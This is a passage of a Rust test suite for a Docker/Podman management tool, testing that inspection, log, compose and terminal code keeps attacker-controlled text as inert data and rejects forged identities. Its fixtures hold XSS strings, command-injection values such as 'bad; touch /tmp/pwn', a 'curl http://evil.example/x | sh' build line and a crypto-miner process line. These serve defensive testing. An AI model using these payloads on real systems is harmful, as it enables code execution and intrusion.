        assert_eq!(inspection.attachments[0].name, "<img src=x onerror=evil()>");
        assert_eq!(
            inspection.labels.get("hostile").unwrap(),
            "</div><script>evil()</script>"
        );

        let wrong = output.replacen(CONTAINER_A, CONTAINER_B, 1);
        assert!(parse_network_inspection(&expected, &wrong).is_err());
        assert!(parse_network_inspection(&expected, "[]").is_err());
        let mut forged = expected;
        forged.id = "bad; touch /tmp/pwn".to_owned();
        assert!(network_inspect_command(&forged).is_err());
    }

    fn sample_image() -> ContainerImage {
        ContainerImage {
            runtime: ContainerRuntime::Docker,
            id: format!("sha256:{CONTAINER_A}"),
            repository: "incident-tools".to_owned(),
            tag: "latest".to_owned(),
            digest: "<none>".to_owned(),
            created_at: "2026-04-16 23:53:26 +0000 UTC".to_owned(),
            size: "12.2MB".to_owned(),
        }
    }

    /// The reason to read an image at all is to see what it will do and how it
    /// was built, so both have to survive the typed boundary intact — text the
    /// image author controls included.
    #[test]
    fn image_inspection_is_exact_typed_and_preserves_hostile_text_as_data() {
        let expected = sample_image();
        assert_eq!(
            image_inspect_command(&expected).unwrap(),
            format!("docker image inspect -- 'sha256:{CONTAINER_A}'")
        );
        let output = serde_json::json!([{
            "Id": format!("sha256:{CONTAINER_A}"),
            "Created": "2026-04-16T23:53:26.1Z",
            "Architecture": "amd64",
            "Os": "linux",
            "Author": "</div><script>evil()</script>",
            "RepoTags": ["incident-tools:latest"],
            "RepoDigests": [],
            "RootFS": {"Type": "layers", "Layers": ["sha256:aa", "sha256:bb"]},
            "Config": {
                "User": "",
                "Entrypoint": ["/bin/sh", "-c"],
                "Cmd": ["sleep", "infinity"],
                "WorkingDir": "/srv",
                "Env": ["PATH=/usr/bin", "API_TOKEN=<img src=x onerror=evil()>"],
                "ExposedPorts": {"8080/tcp": {}, "443/tcp": {}},
                "Volumes": {"/data": {}},
                "Labels": {"maintainer": "<script>label()</script>"}
            }
        }])
        .to_string();
        let inspection = parse_image_inspection(&expected, &output).unwrap();
        assert_eq!(inspection.author, "</div><script>evil()</script>");
        assert_eq!(inspection.entrypoint, vec!["/bin/sh", "-c"]);
        assert_eq!(inspection.command, vec!["sleep", "infinity"]);
        assert_eq!(inspection.working_dir, "/srv");
        assert_eq!(
            inspection.environment[1],
            "API_TOKEN=<img src=x onerror=evil()>"
        );
        assert_eq!(inspection.exposed_ports, vec!["443/tcp", "8080/tcp"]);
        assert_eq!(inspection.declared_volumes, vec!["/data"]);
        assert_eq!(inspection.layers.len(), 2);
        assert_eq!(
            inspection.labels.get("maintainer").unwrap(),
            "<script>label()</script>"
        );
        // The listing keeps the columns the inspection does not restate, so a
        // reader is not shown a blank size or an empty repository.
        assert_eq!(inspection.image.repository, "incident-tools");
        assert_eq!(inspection.image.size, "12.2MB");

        // A record for a different image is refused outright.
        let wrong = output.replacen(CONTAINER_A, CONTAINER_B, 1);
        assert!(parse_image_inspection(&expected, &wrong).is_err());
        assert!(parse_image_inspection(&expected, "[]").is_err());
        let mut forged = expected;
        forged.id = "bad; touch /tmp/pwn".to_owned();
        assert!(image_inspect_command(&forged).is_err());
        assert!(image_history_command(&forged).is_err());
    }

    /// Podman names these fields differently *and* gives two of them as
    /// numbers, so a listing that only knows Docker's shape shows an empty
    /// size column and a run of digits where the date belongs.
    #[test]
    fn image_listing_reads_both_runtimes_own_field_names_and_number_shapes() {
        let docker = serde_json::json!({
            "ID": format!("sha256:{CONTAINER_A}"),
            "Repository": "alpine", "Tag": "3.20", "Digest": "<none>",
            "CreatedAt": "2026-04-16 23:53:26 +0000 UTC", "Size": "12.2MB"
        })
        .to_string();
        let parsed = parse_images(ContainerRuntime::Docker, &docker).unwrap();
        assert_eq!(parsed.items[0].size, "12.2MB");
        assert_eq!(parsed.items[0].created_at, "2026-04-16 23:53:26 +0000 UTC");

        let podman = serde_json::json!({
            "Id": CONTAINER_A, "repository": "localhost/alpine", "tag": "3.20",
            "Digest": "sha256:abc", "Created": 1_776_383_606_i64, "Size": 8_104_044_i64
        })
        .to_string();
        let parsed = parse_images(ContainerRuntime::Podman, &podman).unwrap();
        assert_eq!(parsed.items[0].repository, "localhost/alpine");
        assert_eq!(parsed.items[0].id, CONTAINER_A);
        // Not "8104044", and not "1776383606". The date is the same instant
        // the Docker listing above spells out longhand, which is the check
        // that the conversion is right and not merely plausible.
        assert_eq!(parsed.items[0].size, "8.1MB");
        assert_eq!(parsed.items[0].created_at, "2026-04-16 23:53:26 UTC");
        assert_eq!(parsed.items[0].runtime, ContainerRuntime::Podman);
    }

    #[test]
    fn byte_counts_are_written_the_way_the_other_runtime_writes_them() {
        assert_eq!(human_bytes(0), "0B");
        assert_eq!(human_bytes(999), "999B");
        assert_eq!(human_bytes(1_000), "1.0kB");
        assert_eq!(human_bytes(8_104_044), "8.1MB");
        assert_eq!(human_bytes(2_500_000_000), "2.5GB");
    }

    /// The two forms of one id mean one image. A runtime that prints the
    /// prefix in the inspection but not in the listing must not read as a
    /// mismatch, or every Podman image would refuse to open.
    #[test]
    fn image_identity_matches_across_the_sha256_prefix() {
        let bare = ContainerImage {
            id: CONTAINER_A.to_owned(),
            ..sample_image()
        };
        let prefixed = serde_json::json!([{
            "Id": format!("sha256:{CONTAINER_A}"), "Config": {}
        }])
        .to_string();
        assert!(parse_image_inspection(&bare, &prefixed).is_ok());
        assert_eq!(bare.short_id(), &CONTAINER_A[..12]);
        assert_eq!(sample_image().short_id(), &CONTAINER_A[..12]);
        assert_eq!(
            sample_image().stable_key(),
            format!("docker:image:sha256:{CONTAINER_A}")
        );
    }

    /// A layer's build instruction is the whole point of reading history, and
    /// `<missing>` is the runtime's real answer for a pulled layer rather than
    /// an error to hide.
    #[test]
    fn image_history_keeps_build_instructions_whole_and_reports_missing_layer_ids() {
        let output = [
            serde_json::json!({
                "ID": format!("sha256:{CONTAINER_A}"),
                "CreatedAt": "2026-04-16T23:53:26Z",
                "CreatedBy": "RUN /bin/sh -c curl http://evil.example/x | sh # buildkit",
                "Size": "4.1MB",
                "Comment": "buildkit.dockerfile.v0"
            })
            .to_string(),
            serde_json::json!({
                "ID": "<missing>",
                "CreatedAt": "2026-04-01T00:00:00Z",
                "CreatedBy": "/bin/sh -c #(nop) ADD file:abc in / ",
                "Size": "8.1MB",
                "Comment": ""
            })
            .to_string(),
        ]
        .join("\n");
        let history = parse_image_history(&output).unwrap();
        assert_eq!(history.len(), 2);
        assert_eq!(
            history[0].created_by,
            "RUN /bin/sh -c curl http://evil.example/x | sh # buildkit"
        );
        assert_eq!(history[1].id, "<missing>");
        assert_eq!(history[1].size, "8.1MB");
    }

    #[test]
    fn compose_inventory_is_sorted_bounded_and_never_executes_config_paths() {
        let hostile_config = "</div><script>compose_evil()</script>";
        let output = serde_json::json!([
            {
                "Name": "zeta-project",
                "Status": "running(2), exited(1)",
                "ConfigFiles": hostile_config
            },
            {
                "Name": "alpha_project",
                "Status": "running(1)",
                "ConfigFiles": "/srv/alpha/compose.yml"
            }
        ])
        .to_string();
        let projects = parse_compose_projects(ContainerRuntime::Docker, &output).unwrap();
        assert_eq!(projects.items[0].name, "alpha_project");
        assert_eq!(projects.items[1].name, "zeta-project");
        assert_eq!(projects.items[1].services, 3);
        assert_eq!(projects.items[1].running, 2);
        assert_eq!(projects.items[1].stopped, 1);
        assert_eq!(projects.items[1].config_files, hostile_config);
        assert_eq!(
            projects.items[0].stable_key(),
            "docker:compose:alpha_project"
        );
        assert!(
            parse_compose_projects(
                ContainerRuntime::Docker,
                r#"[{"Name":"bad; id","Status":"running(1)"}]"#
            )
            .is_err()
        );
    }

    #[test]
    fn volume_inspection_and_compose_commands_accept_only_exact_typed_identities() {
        let expected = DockerVolume {
            runtime: ContainerRuntime::Docker,
            name: "evidence_data".to_owned(),
            driver: "local".to_owned(),
            mountpoint: String::new(),
            scope: "local".to_owned(),
            labels: String::new(),
        };
        let hostile = "</div><script>labels_are_text()</script>";
        let output = serde_json::json!([{
            "Name": "evidence_data",
            "Driver": "local",
            "Mountpoint": "/var/lib/docker/volumes/evidence_data/_data",
            "Scope": "local",
            "CreatedAt": "2026-08-12T00:00:00Z",
            "Options": {"device": "/dev/sdb1"},
            "Labels": {"case": hostile}
        }])
        .to_string();
        let inspection = parse_volume_inspection(&expected, &output).unwrap();
        assert_eq!(inspection.volume.name, "evidence_data");
        assert_eq!(
            inspection.volume.mountpoint,
            "/var/lib/docker/volumes/evidence_data/_data"
        );
        assert_eq!(inspection.labels.get("case").unwrap(), hostile);
        assert_eq!(
            volume_inspect_command(&expected).unwrap(),
            "docker volume inspect -- 'evidence_data'"
        );
        let wrong = output.replace("evidence_data", "other_data");
        assert!(parse_volume_inspection(&expected, &wrong).is_err());

        let project = DockerComposeProject {
            runtime: ContainerRuntime::Docker,
            name: "incident".to_owned(),
            status: "running(1)".to_owned(),
            config_files: "/srv/incident/base.yml, /srv/incident/override.yml".to_owned(),
            services: 1,
            running: 1,
            stopped: 0,
        };
        let plan = build_compose_action_plan(
            TargetContext::new()
                .activate(TargetIdentity::new("host-a").unwrap())
                .unwrap(),
            DockerComposeActionRequest {
                project,
                action: DockerComposeAction::Restart,
            },
            parse_compose_config_files("/srv/incident/base.yml, /srv/incident/override.yml")
                .unwrap(),
        )
        .unwrap();
        assert_eq!(
            compose_action_command(&plan).unwrap(),
            "docker compose -p 'incident' -f '/srv/incident/base.yml' -f '/srv/incident/override.yml' restart"
        );
        let metacharacter_path = "/srv/incident/compose.yml; touch /tmp/pwn";
        let metacharacter_plan = build_compose_action_plan(
            TargetContext::new()
                .activate(TargetIdentity::new("host-a").unwrap())
                .unwrap(),
            DockerComposeActionRequest {
                project: DockerComposeProject {
                    config_files: metacharacter_path.to_owned(),
                    ..plan.project().clone()
                },
                action: DockerComposeAction::Pull,
            },
            parse_compose_config_files(metacharacter_path).unwrap(),
        )
        .unwrap();
        assert_eq!(
            compose_action_command(&metacharacter_plan).unwrap(),
            "docker compose -p 'incident' -f '/srv/incident/compose.yml; touch /tmp/pwn' pull"
        );
        for invalid in [
            "relative.yml",
            "/srv/incident/../secret.yml",
            "/srv/incident/a.yml,,/srv/incident/b.yml",
            "/",
            "/srv/incident/a.yml\nid",
        ] {
            assert!(parse_compose_config_files(invalid).is_err(), "{invalid}");
        }
    }

    #[test]
    fn attacker_text_is_bounded_and_never_becomes_container_identity() {
        let long = "x".repeat(MAX_CELL_CHARS + 100);
        let output = format!(
            "{{\"ID\":\"{CONTAINER_A}\",\"Names\":\"<script>bad()</script>\",\"Image\":{},\"State\":\"running\",\"Status\":\"Up\"}}",
            serde_json::to_string(&long).unwrap()
        );
        let parsed = parse_container_list(ContainerRuntime::Docker, &output).unwrap();
        assert_eq!(parsed.items[0].name, "<script>bad()</script>");
        assert_eq!(parsed.items[0].image.chars().count(), 1_024);
        assert!(ContainerIdentity::new(ContainerRuntime::Docker, "web; touch /tmp/pwn").is_err());
        let forged: ContainerIdentity = serde_json::from_value(serde_json::json!({
            "runtime": "docker",
            "id": "--host=evil; touch /tmp/pwn"
        }))
        .unwrap();
        assert!(inspect_command(&forged).is_err());
    }

    #[test]
    fn log_arguments_are_validated_and_shell_quoted() {
        let identity = ContainerIdentity::new(ContainerRuntime::Docker, CONTAINER_A).unwrap();
        let request = ContainerLogsRequest {
            container: identity,
            tail: 100,
            since: Some("1h; id".to_owned()),
            timestamps: true,
            stdout: true,
            stderr: false,
        };
        validate_logs_request(&request).unwrap();
        let command = logs_command(&request);
        assert!(command.starts_with("docker logs --tail 100"));
        assert!(command.contains("--since '1h; id'"));
        assert!(command.ends_with(" 2>/dev/null"));

        // Podman's own cgroups v1 warning is switched off, and nothing else:
        // the container's stderr still comes through.
        let podman = ContainerLogsRequest {
            container: ContainerIdentity::new(ContainerRuntime::Podman, CONTAINER_A).unwrap(),
            stderr: true,
            ..request.clone()
        };
        let command = logs_command(&podman);
        assert!(command.starts_with("PODMAN_IGNORE_CGROUPSV1_WARNING=1 podman logs --tail 100"));
        assert!(!command.contains("2>/dev/null"));

        let mut invalid = request;
        invalid.since = Some("1h\nid".to_owned());
        assert!(validate_logs_request(&invalid).is_err());
    }

    #[test]
    fn inspect_is_curated_bounded_and_identity_checked() {
        let identity = ContainerIdentity::new(ContainerRuntime::Docker, CONTAINER_A).unwrap();
        let output = format!(
            r#"[{{"Id":"{CONTAINER_A}","Name":"/web","Config":{{"Image":"nginx","Env":["SECRET=not-exported"]}},"State":{{"Status":"running","Pid":42}},"HostConfig":{{"Privileged":false}},"Mounts":[],"NetworkSettings":{{"Networks":{{}}}}}}]"#
        );
        let inspection = parse_inspection(&identity, &output).unwrap();
        assert_eq!(inspection.name, "web");
        assert!(inspection.fields.iter().any(|field| field.value == "nginx"));
        assert!(!format!("{inspection:?}").contains("SECRET=not-exported"));

        let wrong = ContainerIdentity::new(ContainerRuntime::Docker, CONTAINER_B).unwrap();
        assert!(parse_inspection(&wrong, &output).is_err());
    }

    #[test]
    fn security_audit_requires_exact_identity_set_and_closed_runtime_command() {
        let first = ContainerIdentity::new(ContainerRuntime::Docker, CONTAINER_A).unwrap();
        let second = ContainerIdentity::new(ContainerRuntime::Docker, CONTAINER_B).unwrap();
        assert_eq!(
            security_audit_command(ContainerRuntime::Docker, &[first.clone(), second.clone()])
                .unwrap(),
            format!("docker inspect --type container '{CONTAINER_A}' '{CONTAINER_B}'")
        );
        assert!(
            security_audit_command(
                ContainerRuntime::Docker,
                &[ContainerIdentity::new(ContainerRuntime::Podman, CONTAINER_A).unwrap()]
            )
            .is_err()
        );

        let duplicate = serde_json::json!([
            {"Id": CONTAINER_A},
            {"Id": CONTAINER_A}
        ])
        .to_string();
        assert!(
            parse_security_inspections(ContainerRuntime::Docker, &[first, second], &duplicate)
                .unwrap_err()
                .to_string()
                .contains("unexpected or duplicate")
        );
    }

    #[test]
    fn security_audit_matches_the_eight_legacy_rule_families_with_stable_score() {
        let identity = ContainerIdentity::new(ContainerRuntime::Docker, CONTAINER_A).unwrap();
        let output = serde_json::json!([{
            "Id": CONTAINER_A,
            "Name": "/hostile<script>",
            "Config": {"Image": "nginx:latest"},
            "State": {"Running": true, "Health": {"Status": "unhealthy"}},
            "HostConfig": {
                "Privileged": true,
                "PidMode": "host",
                "IpcMode": "host",
                "NetworkMode": "host",
                "Memory": 0,
                "CapAdd": ["CAP_SYS_ADMIN", "harmless"]
            },
            "Mounts": [{
                "Type": "bind",
                "Source": "/var/run/docker.sock",
                "Destination": "/run/docker.sock",
                "Mode": "rw",
                "RW": true
            }],
            "NetworkSettings": {"Ports": {
                "8080/tcp": [{"HostIp": "0.0.0.0", "HostPort": "18080"}],
                "9090/tcp": [{"HostIp": "127.0.0.1", "HostPort": "19090"}]
            }}
        }])
        .to_string();
        let inspected = parse_security_inspections(
            ContainerRuntime::Docker,
            std::slice::from_ref(&identity),
            &output,
        )
        .unwrap();
        let audit = build_security_audit(ContainerRuntime::Docker, inspected, false);
        assert_eq!(audit.containers_scanned, 1);
        assert_eq!(audit.summary.total, 10);
        assert_eq!(audit.summary.critical, 3);
        assert_eq!(audit.summary.high, 4);
        assert_eq!(audit.summary.medium, 2);
        assert_eq!(audit.summary.low, 1);
        assert_eq!(audit.summary.score, 13);
        assert!(!audit.truncated);
        assert!(audit.findings.iter().all(|finding| {
            finding.container == identity && finding.container_name == "hostile<script>"
        }));
        assert_eq!(
            audit
                .findings
                .iter()
                .filter(|finding| finding.category == DockerSecurityCategory::Network)
                .count(),
            2
        );
        assert!(audit.findings.iter().any(|finding| {
            finding.category == DockerSecurityCategory::Capabilities
                && finding.description.contains("CAP_SYS_ADMIN")
                && !finding.description.contains("harmless")
        }));
        assert!(audit.findings.iter().any(|finding| {
            finding.category == DockerSecurityCategory::Mount
                && finding.description.contains("docker.sock")
        }));
    }

    #[test]
    fn dangerous_mount_prefixes_do_not_match_unrelated_paths() {
        assert!(path_has_prefix("/proc", "/proc"));
        assert!(path_has_prefix("/proc/sys/kernel", "/proc"));
        assert!(!path_has_prefix("/proc-metrics", "/proc"));
    }

    #[tokio::test]
    async fn security_audit_uses_the_bound_inventory_identity_not_remote_display_text() {
        let (_root, services, harness, session) = terminal_test_services().await;
        harness.set_execute_outputs([
            format!(
                r#"{{"ID":"{CONTAINER_A}","Names":"web; touch /tmp/pwn","Image":"nginx:1.25","State":"exited","Status":"Exited"}}"#
            ),
            serde_json::json!([{
                "Id": CONTAINER_A,
                "Name": "/web; touch /tmp/pwn",
                "Config": {"Image": "nginx:1.25"},
                "State": {"Running": false},
                "HostConfig": {
                    "Privileged": false,
                    "PidMode": "",
                    "IpcMode": "",
                    "NetworkMode": "bridge",
                    "Memory": 536870912_u64,
                    "CapAdd": []
                },
                "Mounts": [],
                "NetworkSettings": {"Ports": {}}
            }])
            .to_string(),
        ]);
        let audit = services
            .docker()
            .security_audit(&session, ContainerRuntime::Docker)
            .await
            .unwrap();
        assert_eq!(audit.containers_scanned, 1);
        assert_eq!(audit.summary.total, 0);
        assert_eq!(audit.summary.score, 100);
        assert!(!audit.truncated);
    }

    #[tokio::test]
    async fn target_is_checked_before_send_and_before_result_apply() {
        let (_root, services) = test_services();
        let guard = services
            .activate_target(TargetIdentity::new("host-a").unwrap())
            .unwrap();
        let calls = AtomicUsize::new(0);
        services
            .activate_target(TargetIdentity::new("host-b").unwrap())
            .unwrap();
        let result = services
            .docker()
            .run_guarded(&guard, || async {
                calls.fetch_add(1, Ordering::SeqCst);
                Ok(())
            })
            .await;
        assert!(matches!(result, Err(CoreError::TargetChanged { .. })));
        assert_eq!(calls.load(Ordering::SeqCst), 0);

        let current = services.target().current_guard().unwrap();
        let result = services
            .docker()
            .run_guarded(&current, || async {
                calls.fetch_add(1, Ordering::SeqCst);
                services
                    .activate_target(TargetIdentity::new("host-c").unwrap())
                    .unwrap();
                Ok(42)
            })
            .await;
        assert!(matches!(result, Err(CoreError::TargetChanged { .. })));
        assert_eq!(calls.load(Ordering::SeqCst), 1);
    }

    /// The caller's id has to be the one the session answers to.
    ///
    /// This minted its own instead, and the caller matches every event against
    /// the id it reserved — so the terminal opened, and then the first poll
    /// failed as a protocol violation and the window was dead. Both sides were
    /// individually correct and their unit tests both passed; only opening a
    /// real shell and typing into it showed it.
    #[tokio::test]
    async fn container_terminal_answers_to_the_id_its_caller_gave_it() {
        let (_root, services, _harness, session) = terminal_test_services().await;
        let container = ContainerIdentity::new(ContainerRuntime::Docker, CONTAINER_A).unwrap();
        let requested = terminal_id();
        let terminal = services
            .docker()
            .open_terminal(
                &session,
                &container,
                ContainerShell::Sh,
                requested.clone(),
                80,
                24,
            )
            .await
            .unwrap();
        assert_eq!(terminal.terminal_id(), requested);
        TerminalTransport::close(&terminal).await.unwrap();
    }

    /// The launch line is fixed apart from a fresh 32-hex session marker.
    fn container_session_marker(launch: &str, runtime: &str, shell: &str) -> String {
        let prefix = format!("{runtime} exec -it -e LOVELYHAWK_TERMINAL=");
        let suffix = format!(" -- '{CONTAINER_A}' {shell}");
        assert!(
            launch.starts_with(&prefix) && launch.ends_with(&suffix),
            "{launch}"
        );
        let marker = &launch[prefix.len()..launch.len() - suffix.len()];
        assert!(
            marker.len() == 32 && marker.bytes().all(|byte| byte.is_ascii_hexdigit()),
            "{marker}"
        );
        marker.to_owned()
    }

    #[test]
    fn filesystem_changes_are_read_by_their_marker_and_anything_else_is_counted() {
        let container = ContainerIdentity::new(ContainerRuntime::Docker, CONTAINER_A).unwrap();
        let output = "WARNING: something the runtime wanted to say\n\
                      C /etc\n\
                      A /etc/cron.d/persist\n\
                      A /tmp/.x/a b\n\
                      D /var/log/auth.log\n\
                      X /weird\n\
                      A relative\n";
        let changes = parse_container_changes(&container, output);
        let read: Vec<_> = changes
            .items
            .iter()
            .map(|change| (change.kind, change.path.as_str()))
            .collect();
        assert_eq!(
            read,
            [
                (ContainerChangeKind::Changed, "/etc"),
                (ContainerChangeKind::Added, "/etc/cron.d/persist"),
                (ContainerChangeKind::Added, "/tmp/.x/a b"),
                (ContainerChangeKind::Deleted, "/var/log/auth.log"),
            ]
        );
        assert_eq!(changes.unreadable_lines, 3);
        assert!(!changes.truncated);
        assert!(parse_container_changes(&container, "").items.is_empty());

        let many: String = (0..=MAX_CONTAINER_CHANGES)
            .map(|index| format!("A /tmp/f{index}\n"))
            .collect();
        let capped = parse_container_changes(&container, &many);
        assert!(capped.truncated);
        assert_eq!(capped.items.len(), MAX_CONTAINER_CHANGES);
    }

    #[test]
    fn processes_keep_the_runtimes_columns_and_the_whole_command_line() {
        let container = ContainerIdentity::new(ContainerRuntime::Docker, CONTAINER_A).unwrap();
        // `docker top` as Docker prints it (ps -ef columns).
        let docker = "UID                 PID                 PPID                C                   STIME               TTY                 TIME                CMD\n\
                      root                4012                3990                0                   10:01               ?                   00:00:00            /bin/sh -c sleep 1000 && echo 'a  b'\n\
                      nobody              4100                4012                0                   10:02               ?                   00:00:01            /tmp/.x/miner --pool evil:3333\n";
        let processes = parse_container_processes(&container, docker).unwrap();
        assert_eq!(
            processes.titles,
            ["UID", "PID", "PPID", "C", "STIME", "TTY", "TIME", "CMD"]
        );
        assert_eq!(processes.rows.len(), 2);
        assert_eq!(processes.rows[0][1], "4012");
        assert_eq!(processes.rows[0][7], "/bin/sh -c sleep 1000 && echo 'a  b'");
        assert_eq!(processes.rows[1][0], "nobody");
        assert_eq!(processes.rows[1][7], "/tmp/.x/miner --pool evil:3333");

        // `podman top`'s own columns, kept as they are.
        let podman = "USER        PID         PPID        %CPU        ELAPSED         TTY         TIME        COMMAND\n\
                      root        1           0           0.000       5m3.2s          ?           0s          sleep infinity\n";
        let processes = parse_container_processes(&container, podman).unwrap();
        assert_eq!(processes.titles[0], "USER");
        assert_eq!(processes.rows[0][7], "sleep infinity");

        // A row with no command at all still has every column.
        let empty = parse_container_processes(&container, "UID PID CMD\nroot 1\n").unwrap();
        assert_eq!(empty.rows[0], ["root", "1", ""]);
        assert!(parse_container_processes(&container, "Error: no such container\n").is_err());
    }

    #[test]
    fn a_file_state_reads_as_a_sentence_about_its_subject() {
        assert_eq!(
            ContainerFileState::Missing.description("目标文件"),
            "目标文件不存在"
        );
        assert_eq!(
            ContainerFileState::File {
                sha256: "a".repeat(64),
                bytes: 28
            }
            .description("文件"),
            "文件现为 28 字节"
        );
        assert_eq!(short_container_id(CONTAINER_A), &CONTAINER_A[..12]);
        assert_eq!(short_container_id("abc"), "abc");
    }

    #[test]
    fn the_cleanup_refuses_anything_but_a_runtime_id_and_a_hex_marker() {
        let marker = "0123456789abcdef0123456789abcdef";
        let command = crate::ssh::container_session_cleanup_command(
            ContainerPtyRuntime::Podman,
            CONTAINER_A,
            marker,
        )
        .unwrap();
        assert!(command.starts_with(&format!("podman exec -- '{CONTAINER_A}' /bin/sh -c '")));
        assert!(command.contains(&format!("LOVELYHAWK_TERMINAL={marker}")));
        for (id, marker) in [
            ("aaaaaaaaaaaa; id", marker),
            (CONTAINER_A, "0123456789abcdef0123456789abcde'"),
            (CONTAINER_A, "short"),
        ] {
            assert!(
                crate::ssh::container_session_cleanup_command(
                    ContainerPtyRuntime::Docker,
                    id,
                    marker
                )
                .is_err()
            );
        }
    }

    #[tokio::test]
    async fn container_terminal_uses_only_typed_runtime_identity_and_shell() {
        let (_root, services, harness, session) = terminal_test_services().await;
        let container = ContainerIdentity::new(ContainerRuntime::Docker, CONTAINER_A).unwrap();
        let terminal = services
            .docker()
            .open_terminal(
                &session,
                &container,
                ContainerShell::Bash,
                terminal_id(),
                120,
                40,
            )
            .await
            .unwrap();

        assert_eq!(terminal.container(), &container);
        assert_eq!(terminal.shell(), ContainerShell::Bash);
        assert_eq!(terminal.target(), session.target());
        let launches = harness.terminal_launches();
        assert_eq!(launches.len(), 1);
        let marker = container_session_marker(&launches[0], "docker", "/bin/bash");
        TerminalTransport::close(&terminal).await.unwrap();
        // Closing ends whatever the shell left running inside the container,
        // found by the marker it was started with.
        let cleanup = harness
            .execute_commands()
            .into_iter()
            .find(|command| command.contains(&marker))
            .expect("a cleanup exec after close");
        assert!(cleanup.starts_with(&format!("docker exec -- '{CONTAINER_A}' /bin/sh -c ")));
        assert!(cleanup.contains("kill -HUP") && cleanup.contains("kill -KILL"));

        let malicious_shell = serde_json::from_str::<ContainerShell>(r#""bash; id""#);
        assert!(malicious_shell.is_err());
        assert!(ContainerIdentity::new(ContainerRuntime::Podman, "abc; id").is_err());
        let forged: ContainerIdentity = serde_json::from_value(serde_json::json!({
            "runtime": "docker",
            "id": "aaaaaaaaaaaa; id"
        }))
        .unwrap();
        assert!(
            services
                .docker()
                .open_terminal(&session, &forged, ContainerShell::Sh, terminal_id(), 80, 24)
                .await
                .is_err()
        );
        assert_eq!(harness.terminal_launches().len(), 1);
    }

    #[tokio::test]
    async fn container_terminal_rejects_wrong_or_stale_target_and_close_stays_available() {
        let (_root, services, harness, session) = terminal_test_services().await;
        let container = ContainerIdentity::new(ContainerRuntime::Podman, CONTAINER_A).unwrap();

        services
            .activate_target(TargetIdentity::new("connection-b").unwrap())
            .unwrap();
        let wrong_target = services
            .docker()
            .open_terminal(
                &session,
                &container,
                ContainerShell::Ash,
                terminal_id(),
                80,
                24,
            )
            .await;
        assert!(matches!(wrong_target, Err(CoreError::TargetChanged { .. })));
        assert!(harness.terminal_launches().is_empty());

        let (_root, services, harness, session) = terminal_test_services().await;
        let terminal = Arc::new(
            services
                .docker()
                .open_terminal(
                    &session,
                    &container,
                    ContainerShell::Ash,
                    terminal_id(),
                    80,
                    24,
                )
                .await
                .unwrap(),
        );
        let launches = harness.terminal_launches();
        assert_eq!(launches.len(), 1);
        container_session_marker(&launches[0], "podman", "/bin/ash");
        services
            .activate_target(TargetIdentity::new("connection-b").unwrap())
            .unwrap();
        assert!(matches!(
            TerminalTransport::write_input(terminal.as_ref(), vec![b'x']).await,
            Err(CoreError::TargetChanged { .. })
        ));
        assert!(matches!(
            TerminalTransport::resize(terminal.as_ref(), 100, 30).await,
            Err(CoreError::TargetChanged { .. })
        ));
        TerminalTransport::close(terminal.as_ref()).await.unwrap();
        tokio::time::timeout(Duration::from_millis(100), async {
            while !harness.terminal_closed() {
                tokio::task::yield_now().await;
            }
        })
        .await
        .expect("close must remain high priority after a target switch");
    }

    #[tokio::test]
    async fn container_terminal_close_interrupts_bounded_input_backpressure() {
        let (_root, services, harness, session) = terminal_test_services().await;
        let container = ContainerIdentity::new(ContainerRuntime::Docker, CONTAINER_A).unwrap();
        let terminal = Arc::new(
            services
                .docker()
                .open_terminal(
                    &session,
                    &container,
                    ContainerShell::Sh,
                    terminal_id(),
                    80,
                    24,
                )
                .await
                .unwrap(),
        );
        for _ in 0..64 {
            TerminalTransport::write_input(terminal.as_ref(), vec![b'x'])
                .await
                .unwrap();
        }
        let blocked_terminal = terminal.clone();
        let blocked = tokio::spawn(async move {
            TerminalTransport::write_input(blocked_terminal.as_ref(), vec![b'y']).await
        });
        tokio::task::yield_now().await;
        TerminalTransport::close(terminal.as_ref()).await.unwrap();
        assert!(
            tokio::time::timeout(Duration::from_millis(100), blocked)
                .await
                .expect("close must interrupt blocked container input")
                .unwrap()
                .is_err()
        );
        // The blocked sender and terminal pump observe the same close watch on
        // different runtimes. Event-stream closure is the pump completion ack.
        assert!(
            tokio::time::timeout(Duration::from_millis(100), terminal.recv())
                .await
                .expect("container terminal pump must close its event stream")
                .is_err()
        );
        assert!(harness.terminal_closed());
    }

    #[derive(Debug)]
    struct CountingExecutor {
        calls: AtomicUsize,
    }

    #[async_trait]
    impl OperationExecutor for CountingExecutor {
        async fn execute(&self, _plan: &OperationPlan) -> CoreResult<ExecutionReceipt> {
            self.calls.fetch_add(1, Ordering::SeqCst);
            Ok(ExecutionReceipt {
                summary: "stopped".to_owned(),
                restore_token: None,
            })
        }

        async fn verify(
            &self,
            _plan: &OperationPlan,
            _receipt: &ExecutionReceipt,
        ) -> CoreResult<VerificationResult> {
            Ok(VerificationResult {
                passed: true,
                detail: "observed container state: exited".to_owned(),
            })
        }

        async fn restore(
            &self,
            _plan: &OperationPlan,
            _receipt: &ExecutionReceipt,
        ) -> CoreResult<()> {
            Ok(())
        }
    }

    #[tokio::test]
    async fn wrong_confirmation_has_zero_side_effect_then_exact_plan_journals_and_verifies() {
        let (_root, services) = test_services();
        let guard = services
            .activate_target(TargetIdentity::new("host-a").unwrap())
            .unwrap();
        let request = ContainerActionRequest {
            container: ContainerIdentity::new(ContainerRuntime::Docker, CONTAINER_A).unwrap(),
            action: ContainerAction::Stop,
        };
        let action = build_action_plan(guard, &request, "running").unwrap();
        let other = OperationPlan::new(
            services.target().current_guard().unwrap(),
            "other operation",
            true,
            None,
        )
        .unwrap();
        let executor = CountingExecutor {
            calls: AtomicUsize::new(0),
        };
        let mut operation = PlannedOperation::plan(action.operation.clone());
        assert!(
            operation
                .confirm(DangerousConfirmation::approve(&other))
                .is_err()
        );
        assert!(
            operation
                .execute(services.target(), &executor)
                .await
                .is_err()
        );
        assert_eq!(executor.calls.load(Ordering::SeqCst), 0);

        operation
            .confirm(DangerousConfirmation::approve(&action.operation))
            .unwrap();
        operation
            .execute(services.target(), &executor)
            .await
            .unwrap();
        operation.journal(services.operation_journal()).unwrap();
        assert!(
            operation
                .verify(services.target(), &executor, services.operation_journal())
                .await
                .unwrap()
                .passed
        );
        let entries = services.operation_journal().entries().unwrap();
        assert_eq!(entries.len(), 2);
        assert_eq!(entries[0].operation_id, action.operation.id);
    }

    #[tokio::test]
    async fn action_rechecks_the_exact_precondition_before_any_remote_mutation() {
        let (_root, services, harness, session) = terminal_test_services().await;
        harness.set_execute_outputs([format!("{CONTAINER_A}\trunning")]);
        let plan = services
            .docker()
            .plan_action(
                &session,
                &ContainerActionRequest {
                    container: ContainerIdentity::new(ContainerRuntime::Docker, CONTAINER_A)
                        .unwrap(),
